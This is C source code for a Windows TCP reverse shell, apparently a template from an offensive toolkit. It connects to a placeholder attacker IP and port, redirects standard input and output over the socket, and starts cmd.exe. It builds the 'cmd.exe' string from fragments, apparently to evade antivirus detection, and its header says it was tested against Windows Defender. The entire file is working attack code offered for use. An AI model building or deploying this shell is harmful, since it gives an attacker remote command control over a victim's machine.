#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "w2_32")

/*
Author: r00t-3xp10it
Program: Windows TCP Reverse Shell
Test under: windows 10 with WindowsDefender.
Based on: Ma~Far$ (Yahav N. Hoffmann)
*/

WSADATA wsaData;
SOCKET Voodoo;
SOCKET Kungfu;
struct sockaddr_in hax;
char aip_addr[16];
STARTUPINFO ini_process;
PROCESS_INFORMATION init_info;
  
int main(int argc, char *argv[]) 
{
      WSAStartup(MAKEWORD(2,2), &wsaData);
      Voodoo=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,(unsigned int)NULL,(unsigned int)NULL);

      hax.sin_family = AF_INET;
      hax.sin_port = htons(LpOrT);
      hax.sin_addr.s_addr = inet_addr("IpAdDr");

      WSAConnect(Voodoo,(SOCKADDR*)&hax, sizeof(hax),NULL,NULL,NULL,NULL);
      if (WSAGetLastError() == 0) {

         memset(&ini_process, 0, sizeof(ini_process));

         ini_process.cb=sizeof(ini_process);
         ini_process.dwFlags=STARTF_USESTDHANDLES;
         ini_process.hStdInput = ini_process.hStdOutput = ini_process.hStdError = (HANDLE)Voodoo;

         char *myArray[4] = { "c", "md.", "ex", "e" };
         char command[8] = "";
         snprintf( command, sizeof(command), "%s%s%s%s", myArray[0], myArray[1], myArray[2], myArray[3]);

         CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_process, &init_info);
         exit(0);
      } else {
         exit(0);
      }    
}
